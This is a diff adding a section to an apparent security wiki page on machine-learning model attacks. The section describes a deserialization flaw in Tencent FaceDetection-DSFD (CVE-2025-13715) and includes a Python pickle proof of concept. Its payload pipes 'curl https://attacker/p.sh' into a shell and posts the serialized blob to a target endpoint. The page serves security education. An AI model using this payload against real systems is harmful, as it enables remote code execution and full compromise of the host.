@@ -189,6 +189,27 @@ model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))
 # /tmp/pwned.txt is created even if you get an error
 ```
 
+### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)
+
+Tencent’s FaceDetection-DSFD exposes a `resnet` endpoint that deserializes user-controlled data. ZDI confirmed that a remote attacker can coerce a victim to load a malicious page/file, have it push a crafted serialized blob to that endpoint, and trigger deserialization as `root`, leading to full compromise.
+
+The exploit flow mirrors typical pickle abuse:
+
+```python
+import pickle, os, requests
+
+class Payload:
+    def __reduce__(self):
+        return (os.system, ("curl https://attacker/p.sh | sh",))
+
+blob = pickle.dumps(Payload())
+requests.post("https://target/api/resnet", data=blob,
+              headers={"Content-Type": "application/octet-stream"})
+```
+
+Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport was HTTP, WebSocket, or a file dropped into a watched directory.
+
+
 ## Models to Path Traversal
 
 As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.
